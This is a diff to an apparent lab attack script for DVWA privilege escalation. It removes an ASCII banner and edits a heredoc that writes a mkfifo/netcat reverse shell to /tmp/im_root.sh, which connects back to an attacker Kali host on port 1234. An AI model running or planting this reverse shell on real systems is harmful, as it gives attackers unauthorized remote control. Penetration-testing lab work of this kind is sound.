@@ -32,12 +32,7 @@ IFS=$'\n\t'
 # === ASCII Art Banner & Color Constants ===
 echo ""
 echo "##################################################################################"
-echo "#    ____   __    __   ____    __    __      ____  _______   _______   _______     #"
-echo "#   |  _  \ |  |  |  | |  _  \  \  \  /  /    / __ \ |       \ |       \ |       \    #"
-echo "#   | | | | |  |  |  | | | | |   \  \/  /    | /  \ ||  .--.  ||  .--.  ||  .--.  |   #"
-echo "#   | | | | |  |  |  | | | | |    \    /     | |  | ||  |  |  ||  |  |  ||  |  |  |   #"
-echo "#   | |_| | |  '--'  | | |_| |     |  |      | \__/ ||  '--'  ||  '--'  ||  '--'  |   #"
-echo "#   |____ /  \______/  |____ /      |__|       \____/ |_______/ |_______/ |_______/    #"
+
 echo "#                                                                                #"
 echo "#                     DVWA Privilege Escalation Automation Suite (PEAS)          #"
 echo "##################################################################################"
@@ -121,7 +116,7 @@ EOF
 #!/bin/bash
 # This script creates a reverse shell back to the attacker (Kali VM).
 rm -f /tmp/f; mkfifo /tmp/f
-cat /tmp/f | /bin/bash -i 2>&1 | nc ${KALI_IP} 1234 > /tmp/f
+cat /tmp/f | /bin/bash -i 2>&1 | nc ${KALI_HOST_IP} 1234 > /tmp/f
 EOF
     chmod +x /tmp/im_root.sh
     print_success "Reverse shell script created and made executable."
